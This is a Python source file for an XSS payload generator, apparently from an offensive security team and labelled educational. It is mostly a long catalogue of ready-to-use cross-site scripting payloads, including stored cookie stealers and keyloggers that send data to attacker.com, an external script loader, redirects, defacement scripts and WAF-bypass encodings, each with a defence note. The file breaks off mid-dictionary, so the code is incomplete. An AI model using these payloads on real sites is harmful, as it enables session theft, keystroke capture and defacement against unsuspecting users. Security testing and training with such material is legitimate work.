#!/usr/bin/env python3
"""
XSS Module - Payload Generation
Generates educational XSS payload templates for learning purposes
Author: Offensive Team Zeta
Organization: ITSOLERA (PVT) LTD
"""

import json
import base64
import urllib.parse
import os
from datetime import datetime

class XSSGenerator:
    """XSS Payload Generator Class"""
    
    def __init__(self):
        """Initialize with payload templates"""
        
        self.payloads = {
            'reflected': {
                'html': [
                    # ===== BASIC SCRIPT TAGS (10) =====
                    {'payload': "<script>alert('XSS')</script>", 'description': 'Basic script tag injection', 'severity': 'High'},
                    {'payload': "<script>alert(1)</script>", 'description': 'Minimal script alert', 'severity': 'High'},
                    {'payload': "<script>alert(document.domain)</script>", 'description': 'Display current domain', 'severity': 'High'},
                    {'payload': "<script>alert(document.cookie)</script>", 'description': 'Display cookies', 'severity': 'Critical'},
                    {'payload': "<script>confirm('XSS')</script>", 'description': 'Confirm dialog box', 'severity': 'High'},
                    {'payload': "<script>prompt('XSS')</script>", 'description': 'Prompt dialog box', 'severity': 'High'},
                    {'payload': "<script>alert(window.origin)</script>", 'description': 'Display window origin', 'severity': 'High'},
                    {'payload': "<script>alert(document.URL)</script>", 'description': 'Display document URL', 'severity': 'High'},
                    {'payload': "<script>alert('XSS')//", 'description': 'Script without closing tag', 'severity': 'High'},
                    {'payload': "<script src=data:,alert(1)>", 'description': 'Script with data URI', 'severity': 'High'},
                    
                    # ===== IMAGE TAGS (12) =====
                    {'payload': "<img src=x onerror=alert('XSS')>", 'description': 'Image tag with onerror event', 'severity': 'High'},
                    {'payload': "<img src=x onerror=alert(1)>", 'description': 'Minimal image onerror', 'severity': 'High'},
                    {'payload': "<img src=x onload=alert('XSS')>", 'description': 'Image tag with onload event', 'severity': 'High'},
                    {'payload': "<img src=x onerror=prompt('XSS')>", 'description': 'Image with prompt dialog', 'severity': 'High'},
                    {'payload': "<img src onerror=alert('XSS')>", 'description': 'Image without src value', 'severity': 'High'},
                    {'payload': "<img src=/ onerror=alert('XSS')>", 'description': 'Image with invalid src', 'severity': 'High'},
                    {'payload': "<img src=javascript:alert('XSS')>", 'description': 'Image with javascript protocol', 'severity': 'High'},
                    {'payload': "<img dynsrc=javascript:alert('XSS')>", 'description': 'Image with dynsrc attribute', 'severity': 'Medium'},
                    {'payload': "<img lowsrc=javascript:alert('XSS')>", 'description': 'Image with lowsrc attribute', 'severity': 'Medium'},
                    {'payload': "<img src='x' onerror='alert(1)'>", 'description': 'Image with quoted attributes', 'severity': 'High'},
                    {'payload': "<img/src=x onerror=alert(1)>", 'description': 'Image with slash separator', 'severity': 'High'},
                    {'payload': "<img src=x:alert(1) onerror=eval(src)>", 'description': 'Image with eval in onerror', 'severity': 'High'},
                    
                    # ===== SVG TAGS (15) =====
                    {'payload': "<svg onload=alert('XSS')>", 'description': 'SVG tag with onload event', 'severity': 'High'},
                    {'payload': "<svg onload=alert(1)>", 'description': 'Minimal SVG onload', 'severity': 'High'},
                    {'payload': "<svg><script>alert('XSS')</script></svg>", 'description': 'SVG with embedded script', 'severity': 'High'},
                    {'payload': "<svg><animate onbegin=alert('XSS')>", 'description': 'SVG animate with onbegin', 'severity': 'Medium'},
                    {'payload': "<svg><set attributeName=onmouseover to=alert(1)>", 'description': 'SVG set attribute', 'severity': 'Medium'},
                    {'payload': "<svg/onload=alert(1)>", 'description': 'SVG with slash separator', 'severity': 'High'},
                    {'payload': "<svg onload=alert`1`>", 'description': 'SVG with template literals', 'severity': 'High'},
                    {'payload': "<svg><animatetransform onbegin=alert(1)>", 'description': 'SVG animatetransform', 'severity': 'Medium'},
                    {'payload': "<svg><title><script>alert(1)</script></title>", 'description': 'SVG title with script', 'severity': 'High'},
                    {'payload': "<svg><desc><script>alert(1)</script></desc>", 'description': 'SVG desc with script', 'severity': 'High'},
                    {'payload': "<svg><foreignObject><script>alert(1)</script></foreignObject>", 'description': 'SVG foreignObject', 'severity': 'High'},
                    {'payload': "<math><mtext><script>alert(1)</script></mtext>", 'description': 'MathML with script', 'severity': 'High'},
                    {'payload': "<svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click</text></a>", 'description': 'SVG animated href', 'severity': 'Medium'},
                    {'payload': "<svg><script>alert&#40;1&#41;</script>", 'description': 'SVG script with HTML entities', 'severity': 'High'},
                    {'payload': "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>", 'description': 'SVG with namespace', 'severity': 'High'},
                    
                    # ===== IFRAME TAGS (8) =====
                    {'payload': "<iframe src=javascript:alert('XSS')>", 'description': 'Iframe with javascript protocol', 'severity': 'High'},
                    {'payload': "<iframe onload=alert('XSS')>", 'description': 'Iframe with onload event', 'severity': 'High'},
                    {'payload': "<iframe srcdoc='<script>alert(1)</script>'>", 'description': 'Iframe with srcdoc attribute', 'severity': 'High'},
                    {'payload': "<iframe src=data:text/html,<script>alert(1)</script>>", 'description': 'Iframe with data URI', 'severity': 'High'},
                    {'payload': "<iframe src=javascript:confirm(1)>", 'description': 'Iframe with confirm', 'severity': 'High'},
                    {'payload': "<iframe src=javascript:prompt(1)>", 'description': 'Iframe with prompt', 'severity': 'High'},
                    {'payload': "<iframe src=j&#x61;vascript:alert(1)>", 'description': 'Iframe with entity encoding', 'severity': 'High'},
                    {'payload': "<iframe/src=javascript:alert(1)>", 'description': 'Iframe with slash separator', 'severity': 'High'},
                    
                    # ===== BODY & HTML TAGS (6) =====
                    {'payload': "<body onload=alert('XSS')>", 'description': 'Body tag with onload event', 'severity': 'Medium'},
                    {'payload': "<body onpageshow=alert('XSS')>", 'description': 'Body tag with onpageshow', 'severity': 'Medium'},
                    {'payload': "<body onhashchange=alert('XSS')>", 'description': 'Body with onhashchange', 'severity': 'Medium'},
                    {'payload': "<body onfocus=alert('XSS')>", 'description': 'Body with onfocus', 'severity': 'Medium'},
                    {'payload': "<body onresize=alert('XSS')>", 'description': 'Body with onresize', 'severity': 'Low'},
                    {'payload': "<body onscroll=alert('XSS')>", 'description': 'Body with onscroll', 'severity': 'Low'},
                    
                    # ===== INPUT & FORM ELEMENTS (10) =====
                    {'payload': "<input onfocus=alert('XSS') autofocus>", 'description': 'Input with autofocus and onfocus', 'severity': 'High'},
                    {'payload': "<input onblur=alert('XSS') autofocus><input autofocus>", 'description': 'Input with blur event', 'severity': 'Medium'},
                    {'payload': "<select onfocus=alert('XSS') autofocus>", 'description': 'Select with autofocus', 'severity': 'Medium'},
                    {'payload': "<textarea onfocus=alert('XSS') autofocus>", 'description': 'Textarea with autofocus', 'severity': 'Medium'},
                    {'payload': "<button onclick=alert('XSS')>Click", 'description': 'Button with onclick', 'severity': 'Medium'},
                    {'payload': "<form><button formaction=javascript:alert(1)>Click", 'description': 'Button with formaction', 'severity': 'High'},
                    {'payload': "<input type=submit formaction=javascript:alert(1)>", 'description': 'Submit with formaction', 'severity': 'High'},
                    {'payload': "<input type=image src=x onerror=alert(1)>", 'description': 'Image input with onerror', 'severity': 'High'},
                    {'payload': "<form><input type=search onsearch=alert(1) autofocus>", 'description': 'Search input with onsearch', 'severity': 'Medium'},
                    {'payload': "<keygen onfocus=alert(1) autofocus>", 'description': 'Keygen with autofocus', 'severity': 'Low'},
                    
                    # ===== DETAILS & DIALOG (5) =====
                    {'payload': "<details open ontoggle=alert('XSS')>", 'description': 'Details tag with ontoggle', 'severity': 'Medium'},
                    {'payload': "<details ontoggle=alert('XSS')><summary>click</summary>", 'description': 'Details with summary', 'severity': 'Medium'},
                    {'payload': "<details><summary>click</summary><iframe src=javascript:alert(1)>", 'description': 'Details with iframe', 'severity': 'High'},
                    {'payload': "<dialog open>XSS</dialog><script>document.querySelector('dialog').onclose=alert(1)</script>", 'description': 'Dialog with onclose', 'severity': 'Medium'},
                    {'payload': "<marquee onstart=alert('XSS')>", 'description': 'Marquee with onstart event', 'severity': 'Low'},
                    
                    # ===== OBJECT & EMBED (8) =====
                    {'payload': "<object data=javascript:alert('XSS')>", 'description': 'Object with javascript protocol', 'severity': 'High'},
                    {'payload': "<embed src=javascript:alert('XSS')>", 'description': 'Embed with javascript protocol', 'severity': 'High'},
                    {'payload': "<object data=data:text/html,<script>alert(1)</script>>", 'description': 'Object with data URI', 'severity': 'High'},
                    {'payload': "<embed src=data:text/html,<script>alert(1)</script>>", 'description': 'Embed with data URI', 'severity': 'High'},
                    {'payload': "<object data='//attacker.com/xss.swf'>", 'description': 'Object with Flash SWF', 'severity': 'High'},
                    {'payload': "<embed code=javascript:alert(1)>", 'description': 'Embed with code attribute', 'severity': 'High'},
                    {'payload': "<applet code=javascript:alert(1)>", 'description': 'Applet with code', 'severity': 'Medium'},
                    {'payload': "<base href=javascript:alert(1)//>", 'description': 'Base tag hijack', 'severity': 'High'},
                    
                    # ===== VIDEO & AUDIO (6) =====
                    {'payload': "<video><source onerror=alert('XSS')>", 'description': 'Video source with onerror', 'severity': 'Medium'},
                    {'payload': "<audio src=x onerror=alert('XSS')>", 'description': 'Audio with onerror', 'severity': 'Medium'},
                    {'payload': "<video src=x onerror=alert(1)>", 'description': 'Video with onerror', 'severity': 'Medium'},
                    {'payload': "<audio onloadstart=alert(1)>", 'description': 'Audio with onloadstart', 'severity': 'Medium'},
                    {'payload': "<video poster=javascript:alert(1)>", 'description': 'Video with poster', 'severity': 'Medium'},
                    {'payload': "<video><track kind=subtitles src=data:text/vtt,WEBVTT default>", 'description': 'Video track XSS', 'severity': 'High'},
                    
                    # ===== MISCELLANEOUS (10) =====
                    {'payload': "<link rel=stylesheet href=data:,*%7Bx:expression(alert(1))%7D>", 'description': 'Link with CSS expression', 'severity': 'Medium'},
                    {'payload': "<style>*{x:expression(alert(1))}</style>", 'description': 'Style with CSS expression', 'severity': 'Medium'},
                    {'payload': "<style>@import'javascript:alert(1)';</style>", 'description': 'Style import javascript', 'severity': 'Medium'},
                    {'payload': "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>", 'description': 'Meta refresh with javascript', 'severity': 'High'},
                    {'payload': "<bgsound src=javascript:alert(1)>", 'description': 'Bgsound with javascript', 'severity': 'Low'},
                    {'payload': "<frameset onload=alert(1)>", 'description': 'Frameset with onload', 'severity': 'Medium'},
                    {'payload': "<table background=javascript:alert(1)>", 'description': 'Table background javascript', 'severity': 'Low'},
                    {'payload': "<a href=javascript:alert(1)>click", 'description': 'Anchor with javascript protocol', 'severity': 'Medium'},
                    {'payload': "<form action=javascript:alert(1)><input type=submit>", 'description': 'Form with javascript action', 'severity': 'High'},
                    {'payload': "<isindex type=submit value=XSS formaction=javascript:alert(1)>", 'description': 'Isindex formaction', 'severity': 'Low'}
                ],
                
                'attribute': [
                    # ===== BASIC BREAKOUTS (15) =====
                    {'payload': '" onload="alert(\'XSS\')', 'description': 'Break out of attribute with onload', 'severity': 'High'},
                    {'payload': '" onfocus="alert(\'XSS\')" autofocus="', 'description': 'Onfocus with autofocus attribute', 'severity': 'High'},
                    {'payload': '" onmouseover="alert(\'XSS\')', 'description': 'Onmouseover event handler', 'severity': 'Medium'},
                    {'payload': '" onclick="alert(\'XSS\')', 'description': 'Onclick event handler', 'severity': 'Medium'},
                    {'payload': '" onerror="alert(\'XSS\')', 'description': 'Onerror event handler', 'severity': 'High'},
                    {'payload': '" onanimationend="alert(\'XSS\')', 'description': 'Onanimationend event', 'severity': 'Medium'},
                    {'payload': '" ontransitionend="alert(\'XSS\')', 'description': 'Ontransitionend event', 'severity': 'Medium'},
                    {'payload': '" ondrag="alert(\'XSS\')', 'description': 'Ondrag event handler', 'severity': 'Medium'},
                    {'payload': '" ondrop="alert(\'XSS\')', 'description': 'Ondrop event handler', 'severity': 'Medium'},
                    {'payload': '" onchange="alert(\'XSS\')', 'description': 'Onchange event handler', 'severity': 'Medium'},
                    {'payload': '" onwheel="alert(\'XSS\')', 'description': 'Onwheel event handler', 'severity': 'Low'},
                    {'payload': '" onsubmit="alert(\'XSS\')', 'description': 'Onsubmit event handler', 'severity': 'High'},
                    {'payload': '" oninput="alert(\'XSS\')', 'description': 'Oninput event handler', 'severity': 'Medium'},
                    {'payload': '" onsearch="alert(\'XSS\')', 'description': 'Onsearch event handler', 'severity': 'Medium'},
                    {'payload': '" onkeydown="alert(\'XSS\')', 'description': 'Onkeydown event handler', 'severity': 'Medium'},
                    
                    # ===== COMPLETE TAG INJECTION (10) =====
                    {'payload': '"><script>alert(\'XSS\')</script>', 'description': 'Close tag and inject script', 'severity': 'High'},
                    {'payload': '"><img src=x onerror=alert(\'XSS\')>', 'description': 'Close tag and inject image', 'severity': 'High'},
                    {'payload': '"><svg onload=alert(\'XSS\')>', 'description': 'Close tag and inject SVG', 'severity': 'High'},
                    {'payload': '"><iframe src=javascript:alert(\'XSS\')>', 'description': 'Close tag and inject iframe', 'severity': 'High'},
                    {'payload': '"><body onload=alert(\'XSS\')>', 'description': 'Close tag and inject body', 'severity': 'Medium'},
                    {'payload': '"><input onfocus=alert(\'XSS\') autofocus>', 'description': 'Close tag and inject input', 'severity': 'High'},
                    {'payload': '"><video src=x onerror=alert(\'XSS\')>', 'description': 'Close tag and inject video', 'severity': 'Medium'},
                    {'payload': '"><audio src=x onerror=alert(\'XSS\')>', 'description': 'Close tag and inject audio', 'severity': 'Medium'},
                    {'payload': '"><object data=javascript:alert(\'XSS\')>', 'description': 'Close tag and inject object', 'severity': 'High'},
                    {'payload': '"><embed src=javascript:alert(\'XSS\')>', 'description': 'Close tag and inject embed', 'severity': 'High'},
                    
                    # ===== ALTERNATIVE QUOTES (8) =====
                    {'payload': '\' onload=\'alert("XSS")\'', 'description': 'Single quote breakout', 'severity': 'High'},
                    {'payload': '\' onfocus=\'alert("XSS")\' autofocus=\'', 'description': 'Single quote with autofocus', 'severity': 'High'},
                    {'payload': '\' onclick=\'alert("XSS")\'', 'description': 'Single quote onclick', 'severity': 'Medium'},
                    {'payload': '\' onerror=\'alert("XSS")\'', 'description': 'Single quote onerror', 'severity': 'High'},
                    {'payload': '\' onmouseover=\'alert("XSS")\'', 'description': 'Single quote onmouseover', 'severity': 'Medium'},
                    {'payload': '\'><script>alert("XSS")</script>', 'description': 'Single quote tag close', 'severity': 'High'},
                    {'payload': '\'><img src=x onerror=alert("XSS")>', 'description': 'Single quote image inject', 'severity': 'High'},
                    {'payload': '\'><svg onload=alert("XSS")>', 'description': 'Single quote SVG inject', 'severity': 'High'}
                ],
                
                'javascript': [
                    # ===== STRING ESCAPES (12) =====
                    {'payload': "'; alert('XSS'); //", 'description': 'Break out of string with semicolon', 'severity': 'High'},
                    {'payload': '"; alert("XSS"); //', 'description': 'Break out with double quotes', 'severity': 'High'},
                    {'payload': "';alert(String.fromCharCode(88,83,83));//", 'description': 'Character code obfuscation', 'severity': 'High'},
                    {'payload': "';alert(/XSS/);//", 'description': 'Regular expression in alert', 'severity': 'High'},
                    {'payload': "`;alert`1`;//", 'description': 'Template literal injection', 'severity': 'High'},
                    {'payload': "\\';alert(1);//", 'description': 'Backslash escape attempt', 'severity': 'High'},
                    {'payload': "';alert(document.domain);//", 'description': 'Alert domain from string', 'severity': 'High'},
                    {'payload': "';confirm(1);//", 'description': 'Confirm dialog', 'severity': 'High'},
                    {'payload': "';prompt(1);//", 'description': 'Prompt dialog', 'severity': 'High'},
                    {'payload': "';eval('alert(1)');//", 'description': 'Eval function call', 'severity': 'High'},
                    {'payload': "';setTimeout('alert(1)',0);//", 'description': 'SetTimeout injection', 'severity': 'High'},
                    {'payload': "';setInterval('alert(1)',0);//", 'description': 'SetInterval injection', 'severity': 'High'},
                    
                    # ===== COMMENT ESCAPES (6) =====
                    {'payload': "*/; alert('XSS'); /*", 'description': 'Break out of multi-line comment', 'severity': 'Medium'},
                    {'payload': "<!--*/; alert('XSS'); //-->", 'description': 'HTML comment escape', 'severity': 'Medium'},
                    {'payload': "//\nalert('XSS');//", 'description': 'Newline comment bypass', 'severity': 'High'},
                    {'payload': '/**/alert(1);//', 'description': 'Empty comment bypass', 'severity': 'High'},
                    {'payload': '/*!alert(1)*/', 'description': 'MySQL-style comment', 'severity': 'Medium'},
                    {'payload': '//*/alert(1);//', 'description': 'Double comment escape', 'severity': 'Medium'},
                    
                    # ===== FUNCTION/BLOCK ESCAPES (7) =====
                    {'payload': "}; alert('XSS'); //", 'description': 'Close function and inject', 'severity': 'Medium'},
                    {'payload': "); alert('XSS'); //", 'description': 'Close parenthesis and inject', 'severity': 'Medium'},
                    {'payload': "]; alert('XSS'); //", 'description': 'Close array and inject', 'severity': 'Medium'},
                    {'payload': "});alert('XSS');//", 'description': 'Close nested structures', 'severity': 'Medium'},
                    {'payload': "break;alert('XSS');//", 'description': 'Break statement injection', 'severity': 'Medium'},
                    {'payload': "return;alert('XSS');//", 'description': 'Return statement injection', 'severity': 'Medium'}
                ]
            },
            
            'stored': {
                'html': [
                    # ===== COOKIE STEALERS (8) =====
                    {'payload': "<script>fetch('http://attacker.com?c='+document.cookie)</script>", 'description': 'Cookie stealer using fetch API', 'severity': 'Critical'},
                    {'payload': "<img src=x onerror='location=\"http://attacker.com?c=\"+document.cookie'>", 'description': 'Cookie stealer using image error', 'severity': 'Critical'},
                    {'payload': "<script>new Image().src='http://attacker.com?c='+document.cookie</script>", 'description': 'Cookie stealer using Image object', 'severity': 'Critical'},
                    {'payload': "<svg onload='fetch(\"http://attacker.com?c=\"+document.cookie)'>", 'description': 'SVG-based cookie stealer', 'severity': 'Critical'},
                    {'payload': "<script>navigator.sendBeacon('http://attacker.com',document.cookie)</script>", 'description': 'Cookie stealer using sendBeacon', 'severity': 'Critical'},
                    {'payload': "<script>document.location='http://attacker.com?c='+document.cookie</script>", 'description': 'Cookie stealer using location', 'severity': 'Critical'},
                    {'payload': "<iframe src=x onload=\"fetch('http://attacker.com?c='+parent.document.cookie)\">", 'description': 'Iframe cookie stealer', 'severity': 'Critical'},
                    {'payload': "<script>with(document)with(body)with(appendChild(createElement('script')))src='//attacker.com'</script>", 'description': 'External script loader', 'severity': 'Critical'},
                    
                    # ===== KEYLOGGERS (4) =====
                    {'payload': "<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>", 'description': 'Simple keylogger', 'severity': 'Critical'},
                    {'payload': "<script>document.addEventListener('keydown',e=>fetch('//attacker.com?k='+e.key))</script>", 'description': 'Keydown event logger', 'severity': 'Critical'},
                    {'payload': "<script>setInterval(()=>fetch('//attacker.com?v='+document.querySelector('input').value),1000)</script>", 'description': 'Input value logger', 'severity': 'Critical'},
                    {'payload': "<script>document.querySelectorAll('input').forEach(i=>i.addEventListener('input',e=>fetch('//attacker.com?'+e.target.value)))</script>", 'description': 'Multi-input logger', 'severity': 'Critical'},
                    
                    # ===== REDIRECTS (6) =====
                    {'payload': "<script>window.location='http://attacker.com'</script>", 'description': 'Page redirect', 'severity': 'High'},
                    {'payload': "<meta http-equiv='refresh' content='0;url=http://attacker.com'>", 'description': 'Meta refresh redirect', 'severity': 'High'},
                    {'payload': "<script>top.location='http://attacker.com'</script>", 'description': 'Top frame redirect', 'severity': 'High'},
                    {'payload': "<script>parent.location='http://attacker.com'</script>", 'description': 'Parent frame redirect', 'severity': 'High'},
                    {'payload': "<script>window.open('http://attacker.com','_self')</script>", 'description': 'Window.open redirect', 'severity': 'High'},
                    {'payload': "<script>location.replace('http://attacker.com')</script>", 'description': 'Location.replace redirect', 'severity': 'High'},
                    
                    # ===== DEFACEMENT (6) =====
                    {'payload': "<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>", 'description': 'Page defacement', 'severity': 'High'},
                    {'payload': "<script>document.write('<h1>Defaced</h1>')</script>", 'description': 'Document.write defacement', 'severity': 'High'},
                    {'payload': "<script>document.body.style.background='red'</script>", 'description': 'Background color change', 'severity': 'Medium'},
                    {'payload': "<script>document.title='Hacked by XSS'</script>", 'description': 'Title change', 'severity': 'Low'},
                    {'payload': "<script>alert('XSS');document.body.remove()</script>", 'description': 'Body removal', 'severity': 'High'},
                    {'payload': "<style>body{display:none}</style><h1>Hacked</h1>", 'description': 'CSS-based hiding', 'severity': 'Medium'},
                    
                    # ===== PERSISTENT PAYLOADS (18) =====
                    {'payload': "<img src=x onerror=alert('Stored XSS')>", 'description': 'Simple stored XSS', 'severity': 'High'},
                    {'payload': "<svg onload=alert('Stored XSS')>", 'description': 'SVG stored XSS', 'severity': 'High'},
                    {'payload': "<iframe src=javascript:alert('Stored')>", 'description': 'Iframe stored XSS', 'severity': 'High'},
                    {'payload': "<script>alert('Stored')</script>", 'description': 'Basic stored script', 'severity': 'High'},
                    {'payload': "<body onload=alert('Stored')>", 'description': 'Body onload stored', 'severity': 'Medium'},
                    {'payload': "<input onfocus=alert('Stored') autofocus>", 'description': 'Input stored XSS', 'severity': 'High'},
                    {'payload': "<marquee onstart=alert('Stored')>", 'description': 'Marquee stored XSS', 'severity': 'Low'},
                    {'payload': "<details open ontoggle=alert('Stored')>", 'description': 'Details stored XSS', 'severity': 'Medium'},
                    {'payload': "<video src=x onerror=alert('Stored')>", 'description': 'Video stored XSS', 'severity': 'Medium'},
                    {'payload': "<audio src=x onerror=alert('Stored')>", 'description': 'Audio stored XSS', 'severity': 'Medium'},
                    {'payload': "<select onfocus=alert('Stored') autofocus>", 'description': 'Select stored XSS', 'severity': 'Medium'},
                    {'payload': "<textarea onfocus=alert('Stored') autofocus>", 'description': 'Textarea stored XSS', 'severity': 'Medium'},
                    {'payload': "<object data=javascript:alert('Stored')>", 'description': 'Object stored XSS', 'severity': 'High'},
                    {'payload': "<embed src=javascript:alert('Stored')>", 'description': 'Embed stored XSS', 'severity': 'High'},
                    {'payload': "<button onclick=alert('Stored')>Click</button>", 'description': 'Button stored XSS', 'severity': 'Medium'},
                    {'payload': "<form action=javascript:alert('Stored')><input type=submit>", 'description': 'Form stored XSS', 'severity': 'High'},
                    {'payload': "<link rel=stylesheet href=data:,*%7Bx:expression(alert('Stored'))%7D>", 'description': 'Link CSS stored', 'severity': 'Medium'},
                    {'payload': "<base href=javascript:alert('Stored')//>", 'description': 'Base tag stored', 'severity': 'High'}
                ],
                
                'attribute': [
                    {'payload': '" onfocus="fetch(\'http://attacker.com?c=\'+document.cookie)" autofocus="', 'description': 'Attribute-based cookie stealer', 'severity': 'Critical'},
                    {'payload': '"><img src=x onerror="location=\'http://attacker.com?c=\'+document.cookie">', 'description': 'Break out and steal cookie', 'severity': 'Critical'},
                    {'payload': '" onclick="alert(\'Stored XSS\')', 'description': 'Stored onclick handler', 'severity': 'High'},
                    {'payload': '" onload="alert(\'Stored\')', 'description': 'Stored onload handler', 'severity': 'High'},
                    {'payload': '" onerror="alert(\'Stored\')', 'description': 'Stored onerror handler', 'severity': 'High'},
                    {'payload': '" onmouseover="alert(\'Stored\')', 'description': 'Stored onmouseover', 'severity': 'Medium'},
                    {'payload': '\' onclick=\'alert("Stored")\'', 'description': 'Single quote stored onclick', 'severity': 'High'},
                    {'payload': '\'><script>alert("Stored")</script>', 'description': 'Single quote tag injection', 'severity': 'High'},
                    {'payload': '" autofocus onfocus="alert(1)', 'description': 'Autofocus attribute attack', 'severity': 'High'},
                    {'payload': '" style="x:expression(alert(1))"', 'description': 'CSS expression attack', 'severity': 'Medium'}
                ],
                
                'javascript': [
                    {'payload': "'; fetch('http://attacker.com?c='+document.cookie); //", 'description': 'JS context cookie stealer', 'severity': 'Critical'},
                    {'payload': '"; window.location="http://attacker.com"; //', 'description': 'JS context redirect', 'severity': 'High'},
                    {'payload': "';document.write('<img src=x onerror=alert(1)>');//", 'description': 'Document.write injection', 'severity': 'High'},
                    {'payload': "';eval(atob('YWxlcnQoMSk='));//", 'description': 'Base64 eval injection', 'severity': 'High'},
                    {'payload': "';setTimeout(alert(1),0);//", 'description': 'SetTimeout stored', 'severity': 'High'},
                    {'payload': "';Function('alert(1)')();//", 'description': 'Function constructor', 'severity': 'High'},
                    {'payload': "';\\u0061lert(1);//", 'description': 'Unicode escape', 'severity': 'High'},
                    {'payload': "';alert(String.fromCharCode(88,83,83));//", 'description': 'CharCode stored', 'severity': 'High'}
                ]
            },
            
            'dom': {
                'html': [
                    {'payload': "<img src=x onerror=alert(document.domain)>", 'description': 'DOM-based XSS showing domain', 'severity': 'High'},
                    {'payload': "#<script>alert('DOM XSS')</script>", 'description': 'Hash fragment injection', 'severity': 'High'},
                    {'payload': "<svg onload=alert(window.location)>", 'description': 'Show current location', 'severity': 'Medium'},
                    {'payload': "<img src=x onerror=alert(document.URL)>", 'description': 'Display document URL', 'severity': 'Medium'},
                    {'payload': '"><svg onload=alert(1)>', 'description': 'Break out for DOM manipulation', 'severity': 'High'},
                    {'payload': "<img src=x onerror=alert(document.referrer)>", 'description': 'Display referrer', 'severity': 'Medium'},
                    {'payload': "<img src=x onerror=alert(location.hash)>", 'description': 'Display hash', 'severity': 'Medium'},
                    {'payload': "<img src=x onerror=alert(location.search)>", 'description': 'Display search params', 'severity': 'Medium'},
                    {'payload': "<img src=x onerror=alert(document.baseURI)>", 'description': 'Display base URI', 'severity': 'Medium'},
                    {'payload': "<script>alert(location.href)</script>", 'description': 'Alert href', 'severity': 'High'},
                    {'payload': "<script>alert(document.documentURI)</script>", 'description': 'Alert document URI', 'severity': 'High'},
                    {'payload': "<iframe src=javascript:alert(parent.document.domain)>", 'description': 'Parent domain access', 'severity': 'High'},
                    {'payload': "<img src=x onerror=eval(location.hash.slice(1))>", 'description': 'Eval from hash', 'severity': 'Critical'},
                    {'payload': "<img src=x onerror=eval(atob(location.hash.slice(1)))>", 'description': 'Base64 hash eval', 'severity': 'Critical'},
                    {'payload': "<img src=x onerror=document.write(location.hash)>", 'description': 'Write hash to document', 'severity': 'High'}
                ],
                
                'attribute': [
                    {'payload': '" onload="alert(document.domain)', 'description': 'DOM attribute injection', 'severity': 'High'},
                    {'payload': '" onfocus="alert(document.URL)" autofocus="', 'description': 'DOM-based attribute XSS', 'severity': 'High'},
                    {'payload': '" onclick="alert(location.href)', 'description': 'DOM onclick href', 'severity': 'High'},
                    {'payload': '" onerror="alert(location.hash)', 'description': 'DOM onerror hash', 'severity': 'High'},
                    {'payload': "'onclick='alert(document.domain)'", 'description': 'Single quote DOM attack', 'severity': 'High'},
                    {'payload': '"><img src=x onerror=alert(document.URL)>', 'description': 'DOM image injection', 'severity': 'High'}
                ],
                
                'javascript': [
                    {'payload': 'javascript:alert(document.domain)', 'description': 'JavaScript protocol handler', 'severity': 'High'},
                    {'payload': 'javascript:alert(document.cookie)', 'description': 'JavaScript protocol cookie access', 'severity': 'Critical'},
                    {'payload': 'javascript:alert(location.href)', 'description': 'JavaScript protocol href', 'severity': 'High'},
                    {'payload': 'javascript:void(alert(document.domain))', 'description': 'JavaScript void function', 'severity': 'High'},
                    {'payload': 'data:text/html,<script>alert(parent.document.domain)</script>', 'description': 'Data URI DOM access', 'severity': 'High'}
                ]
            }
        }
        
        # ===== WAF BYPASS TECHNIQUES =====
        self.bypass_techniques = {
            'case_manipulation': {
                'original': '<script>alert("XSS")</script>',
                'bypassed': '<ScRiPt>alert("XSS")</sCrIpT>',
                'explanation': 'Many WAFs use case-sensitive regex matching. Mixed case letters confuse simple pattern matching filters.',
                'waf_reason': 'WAFs using lowercase-only regex like /script/ will miss <ScRiPt>',
                'defense': 'Modern WAFs normalize input to lowercase before matching. Use case-insensitive regex flags.'
            },
            'tag_switching': {
                'original': '<script>alert("XSS")</script>',
                'bypassed': '<img src=x onerror=alert("XSS")>',
                'explanation': 'When script tags are blocked, alternative HTML tags with event handlers can execute JavaScript.',
                'waf_reason': 'WAFs that only block script tags miss hundreds of other valid HTML event handlers',
                'defense': 'Whitelist only necessary HTML tags. Use HTML parsers instead of regex for tag detection.'
            },
            'comment_insertion': {
                'original': '<script>alert("XSS")</script>',
                'bypassed': '<scr<!--comment-->ipt>alert("XSS")</scr<!---->ipt>',
                'explanation': 'HTML comments inserted inside tag names can break WAF pattern matching while browsers still parse it.',
                'waf_reason': 'Regex-based filters check for complete tag names and miss fragments with embedded comments',
                'defense': 'Parse HTML properly using DOM parsers rather than relying on regex pattern matching.'
            },
            'double_encoding': {
                'original': '<script>alert("XSS")</script>',
                'bypassed': '%253Cscript%253Ealert("XSS")%253C%252Fscript%253E',
                'explanation': 'Double URL encoding can bypass WAFs that only decode once.',
                'waf_reason': 'If WAF decodes URL encoding once but application decodes twice, payload reaches browser unfiltered',
                'defense': 'Decode all encoding layers before WAF inspection. Apply recursive URL decoding.'
            },
            'html_entity_encoding': {
                'original': '<script>alert("XSS")</script>',
                'bypassed': '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
                'explanation': 'HTML entities are decoded by browsers but may bypass WAF string matching.',
                'waf_reason': 'WAFs checking for < and > characters miss their HTML entity equivalents',
                'defense': 'Decode HTML entities before WAF inspection. Use context-aware output encoding.'
            },
            'javascript_encoding': {
                'original': "alert('XSS')",
                'bypassed': "\\u0061\\u006C\\u0065\\u0072\\u0074('XSS')",
                'explanation': 'JavaScript Unicode escapes are valid JS but bypass string-based filters.',
                'waf_reason': 'WAFs matching keyword "alert" miss the Unicode escaped version',
                'defense': 'Evaluate JavaScript in a sandbox to detect obfuscated code. Use AST-based analysis.'
            },
            'template_literals': {
                'original': "alert('XSS')",
                'bypassed': 'alert`XSS`',
                'explanation': 'Template literals (backticks) can replace parentheses in function calls, bypassing parenthesis-based filters.',
                'waf_reason': 'Filters blocking alert() with parentheses miss template literal syntax',
                'defense': 'Block all forms of JavaScript execution. Use strict CSP to prevent inline scripts.'
            },
            'fromcharcode': {
                'original': "alert('XSS')",
                'bypassed': "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
                'explanation': 'String.fromCharCode converts ASCII codes to characters, hiding the actual payload from WAF rules.',
                'waf_reason': 'WAFs looking for "alert" string miss the encoded version using character codes',
                'defense': 'Block eval() and String.fromCharCode in CSP. Use runtime JavaScript analysis.'
            },
